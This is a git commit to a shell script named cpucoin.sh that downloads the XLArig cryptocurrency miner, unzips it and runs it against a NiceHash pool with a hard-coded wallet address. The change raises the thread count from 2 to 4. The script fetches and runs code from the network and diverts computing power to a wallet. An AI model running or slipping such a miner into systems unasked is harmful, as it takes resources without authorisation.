a513f656fbe82b9552e0f5812e9b3d59ae6fb2cc
Kocalkocal93Kocalkocal93 <86622926+Kocalkocal93Kocalkocal93@users.noreply.github.com>
2021-07-11 18:17:15 +0700

    Update cpucoin.sh

--- cpucoin.sh
+++ cpucoin.sh
@@ -3,4 +3,4 @@ apt-get install wget -y
 apt-get install unzip
 wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip
 unzip XLArig-v5.2.2-linux-x86_64.zip
-./xlarig -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380 -u 3MYuuKJ78wazszEA8d3MLjKQW1tH7P6cyW.cloud -p x -a rx -t 2
+./xlarig -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380 -u 3MYuuKJ78wazszEA8d3MLjKQW1tH7P6cyW.cloud -p x -a rx -t 4
